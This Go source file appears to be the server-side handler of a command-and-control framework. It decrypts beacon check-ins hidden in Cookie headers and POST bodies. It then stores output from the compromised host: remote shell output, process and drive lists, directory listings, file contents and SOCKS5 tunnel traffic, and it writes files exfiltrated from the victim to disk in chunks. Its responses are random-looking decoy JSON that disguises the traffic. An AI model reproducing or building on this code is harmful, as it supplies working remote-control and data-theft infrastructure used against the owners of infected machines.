package communication

import (
	"BackendTemplate/pkg/command"
	"BackendTemplate/pkg/config"
	"BackendTemplate/pkg/database"
	"BackendTemplate/pkg/encrypt"
	"BackendTemplate/pkg/logger"
	"BackendTemplate/pkg/utils"
	"encoding/binary"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"os"
	"path/filepath"
	"strings"
)

func PostHttp(w http.ResponseWriter, r *http.Request) {
	cookieValue := r.Header.Get("Cookie")

	encryptMetainfo := strings.TrimPrefix(cookieValue, config.Http_get_metadata_prepend)

	tmpMetainfo, err := encrypt.DecodeBase64([]byte(encryptMetainfo))
	if err != nil {
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusInternalServerError)

		// 返回 JSON 数据
		json.NewEncoder(w).Encode(map[string]string{
			"error": "Something went wrong",
		})
	}
	metainfo, err := encrypt.Decrypt(tmpMetainfo)
	if err != nil {
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusInternalServerError)

		// 返回 JSON 数据
		json.NewEncoder(w).Encode(map[string]string{
			"error": "Something went wrong",
		})
	}
	uid := encrypt.BytesToMD5(metainfo)

	dataValue, err := io.ReadAll(r.Body)
	//dataValue := c.GetHeader("X-AUTH")
	dataBytes, _ := encrypt.DecodeBase64([]byte(dataValue))
	dataBytes, _ = encrypt.Decrypt(dataBytes)
	dataBytes, _ = encrypt.Decrypt(dataBytes)

	replyTypeBytes := dataBytes[:4]
	data := dataBytes[4:]
	replyType := binary.BigEndian.Uint32(replyTypeBytes)
	switch replyType {
	case 0: //命令行展示
		var shell database.Shell
		database.Engine.Where("uid = ?", uid).Get(&shell)
		shell.ShellContent += string(data) + "\n"
		database.Engine.Where("uid = ?", uid).Update(&shell)
	case 31: // 错误展示
		var shell database.Shell
		database.Engine.Where("uid = ?", uid).Get(&shell)
		shell.ShellContent += "!Error: " + string(data) + "\n"
		database.Engine.Where("uid = ?", uid).Update(&shell)
	case command.PS:
		command.VarPidQueue.Add(uid, string(data))
	case command.FileBrowse:
		command.VarFileBrowserQueue.Add(uid, string(data))
	case 22: //文件下载第一条信息
		fileLen := int(binary.BigEndian.Uint32(data[:4]))
		filePath := string(data[4:])

		// 使用通用的安全路径函数
		fullPath, err := utils.GetSafeFilePath(uid, filePath)
		if err != nil {
			logger.Error("Security check failed: %v", err)
			break
		}

		// 更新数据库
		sql := `
UPDATE downloads
SET file_size = ?, downloaded_size = ?
WHERE uid = ? AND file_path = ?;
`
		_, err = database.Engine.QueryString(sql, fileLen, 0, uid, filePath)
		if err != nil {
			logger.Error("Database update failed: %v", err)
		}

		// 确保下载目录存在
		downloadDir := filepath.Dir(fullPath)
		if err := os.MkdirAll(downloadDir, 0755); err != nil {
			logger.Error("Failed to create download directory: %v", err)
			break
		}

		// 检查文件是否存在，如果存在则删除
		if _, err := os.Stat(fullPath); err == nil {
			if err := os.Remove(fullPath); err != nil {
				logger.Error("Failed to remove existing file: %v", err)
				break
			}
		}

		// 创建新文件（使用安全路径）
		fp, err := os.OpenFile(fullPath, os.O_CREATE|os.O_TRUNC|os.O_WRONLY, 0644)
		if err != nil {
			logger.Error("Failed to create file: %v", err)
			break
		}
		defer fp.Close()

	case command.DOWNLOAD: //文件下载
		filePathLen := int(binary.BigEndian.Uint32(data[:4]))
		filePath := string(data[4 : 4+filePathLen])
		fileContent := data[4+filePathLen:]

		// 使用通用的安全路径函数
		fullPath, err := utils.GetSafeFilePath(uid, filePath)
		if err != nil {
			logger.Error("Security check failed: %v", err)
			break
		}

		var fileDownloads database.Downloads
		database.Engine.Where("uid = ? AND file_path = ?", uid, filePath).Get(&fileDownloads)
		fileDownloads.DownloadedSize += len(fileContent)
		database.Engine.Where("uid = ? AND file_path = ?", uid, filePath).Update(&fileDownloads)

		// 确保下载目录存在
		downloadDir := filepath.Dir(fullPath)
		if err := os.MkdirAll(downloadDir, 0755); err != nil {
			logger.Error("Failed to create download directory: %v", err)
			break
		}

		// 使用安全路径打开文件
		fp, err := os.OpenFile(fullPath, os.O_APPEND|os.O_WRONLY|os.O_CREATE, 0644)
		if err != nil {
			logger.Error("Failed to open file: %v", err)
			break
		}
		defer fp.Close()

		if _, err := fp.Write(fileContent); err != nil {
			logger.Error("Failed to write file content: %v", err)
		}

	case command.DRIVES:
		drives := utils.GetExistingDrives(data)
		command.VarDrivesQueue.Add(uid, drives)
	case command.FileContent:
		filePathLen := int(binary.BigEndian.Uint32(data[:4]))
		filePath := string(data[4 : 4+filePathLen])
		fileContent := data[4+filePathLen:]
		command.VarFileContentQueue.Add(uid, filePath, string(fileContent))
	case command.Socks5Data:
		md5sign := data[:16]
		rawData := data[16:]
		command.VarSocks5Queue.Add(uid, fmt.Sprintf("%x", md5sign), string(rawData))
	}
	var pos1, pos2, pos3 []byte
	pos1, _ = encrypt.EncodeBase64(encrypt.GenRandomBytes())
	pos2, _ = encrypt.EncodeBase64(encrypt.GenRandomBytes())
	pos3 = []byte{}
	response := map[string]interface{}{
		"data": map[string]interface{}{
			"log_id": encrypt.GenRandomLogID(),
			"action_rule": map[string][]byte{
				"pos_1": pos1,
				"pos_2": pos2,
				"pos_3": pos3,
			},
		},
	}

	// 设置 Content-Type 为 JSON
	w.Header().Set("Content-Type", "application/json")
	w.WriteHeader(http.StatusOK)

	// 编码 JSON 并写入响应
	json.NewEncoder(w).Encode(response)
}
